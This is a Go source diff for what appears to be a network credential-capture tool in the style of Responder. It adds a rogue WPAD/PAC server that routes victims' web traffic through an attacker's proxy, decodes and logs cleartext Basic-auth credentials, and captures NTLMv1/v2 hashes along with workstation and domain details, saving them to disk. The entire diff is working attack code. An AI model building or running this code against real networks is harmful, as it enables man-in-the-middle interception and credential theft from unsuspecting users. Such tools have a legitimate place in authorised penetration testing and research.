@@ -15,6 +15,11 @@ var connChallenges sync.Map // key: remoteAddr string, value: [8]byte
 
 func serveHTTP(ifaceIP net.IP) {
 	mux := http.NewServeMux()
+	if wpadEnabled {
+		mux.HandleFunc("/wpad.dat", handleWPAD)
+		mux.HandleFunc("/wpad/wpad.dat", handleWPAD)
+		mux.HandleFunc("/proxy.pac", handleWPAD)
+	}
 	mux.HandleFunc("/", handleHTTPNTLM)
 
 	addr := fmt.Sprintf("%s:80", ifaceIP)
@@ -24,17 +29,40 @@ func serveHTTP(ifaceIP net.IP) {
 		return
 	}
 	logInfo("HTTP listening on %s:80", ifaceIP)
+	if wpadEnabled {
+		logInfo("WPAD  serving PAC file at http://%s/wpad.dat (proxy: %s)", ifaceIP, wpadProxyHost)
+	}
 	http.Serve(ln, mux)
 }
 
+// handleWPAD serves a WPAD PAC file that routes all traffic through our proxy.
+func handleWPAD(w http.ResponseWriter, r *http.Request) {
+	logInfo("[WPAD] PAC file requested by %s", r.RemoteAddr)
+	proxy := wpadProxyHost
+	if proxy == "" {
+		host, _, _ := net.SplitHostPort(r.Host)
+		if host == "" {
+			host = r.Host
+		}
+		proxy = fmt.Sprintf("%s:3128", host)
+	}
+	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
+    if (isInNet(host, "127.0.0.0", "255.0.0.0")) { return "DIRECT"; }
+    return "PROXY %s; DIRECT";
+}
+`, proxy)
+	w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(pac)))
+	w.WriteHeader(200)
+	w.Write([]byte(pac))
+}
+
 func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
-	// Read and discard body to keep connection alive
 	io.Copy(io.Discard, r.Body)
 
 	auth := r.Header.Get("Authorization")
 
 	if auth == "" {
-		// Step 1: no auth header → send 401 with NTLM challenge advertisement
 		logVerbose("HTTP connection from %s — sending NTLM negotiate", r.RemoteAddr)
 		w.Header().Set("WWW-Authenticate", "NTLM")
 		w.Header().Set("Connection", "keep-alive")
@@ -42,13 +70,24 @@ func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if !strings.HasPrefix(auth, "NTLM ") {
+	// Basic auth — capture cleartext credentials
+	if strings.HasPrefix(strings.ToUpper(auth), "BASIC ") {
+		decoded, err := base64.StdEncoding.DecodeString(auth[6:])
+		if err == nil {
+			logSuccess("[HTTP] Basic auth cleartext from %s: %s", r.RemoteAddr, string(decoded))
+		}
 		w.Header().Set("WWW-Authenticate", "NTLM")
 		w.WriteHeader(401)
 		return
 	}
 
-	raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(auth, "NTLM "))
+	if !strings.HasPrefix(strings.ToUpper(auth), "NTLM ") {
+		w.Header().Set("WWW-Authenticate", "NTLM")
+		w.WriteHeader(401)
+		return
+	}
+
+	raw, err := base64.StdEncoding.DecodeString(auth[5:])
 	if err != nil {
 		w.WriteHeader(400)
 		return
@@ -60,15 +99,18 @@ func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	msgType := uint32(ntlm[8]) | uint32(ntlm[9])<<8 | uint32(ntlm[10])<<16 | uint32(ntlm[11])<<24
-
-	switch msgType {
+	switch ntlmMsgType(ntlm) {
 	case 1: // NTLMSSP_NEGOTIATE → issue challenge
+		ws, dom, osVer := ParseNTLMNegotiate(ntlm)
+		if ws != "" || dom != "" {
+			logVerbose("HTTP NTLM Type1 from %s — workstation=%s domain=%s os=%s", r.RemoteAddr, ws, dom, osVer)
+		} else {
+			logVerbose("HTTP NTLM Type1 from %s — issuing challenge", r.RemoteAddr)
+		}
 		challenge := getChallenge()
 		connChallenges.Store(r.RemoteAddr, challenge)
 		ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
 		encoded := base64.StdEncoding.EncodeToString(ntlmChallenge)
-		logVerbose("HTTP NTLM Type1 from %s — issuing challenge", r.RemoteAddr)
 		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
 		w.Header().Set("Connection", "keep-alive")
 		w.WriteHeader(401)
@@ -88,12 +130,14 @@ func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 			w.WriteHeader(401)
 			return
 		}
-		logSuccess("[HTTP] NTLMv2 captured from %s", r.RemoteAddr)
+		proto := "NTLMv2"
+		if lmMode {
+			proto = "NTLMv1"
+		}
+		logSuccess("[HTTP] %s captured from %s", proto, r.RemoteAddr)
 		logSuccess("       %s\\%s", domain, user)
 		logSuccess("       %s", hash)
 		saveHash(hash)
-
-		// Return 401 to indicate auth failed (we never actually authenticate)
 		w.Header().Set("WWW-Authenticate", "NTLM")
 		w.WriteHeader(401)
 
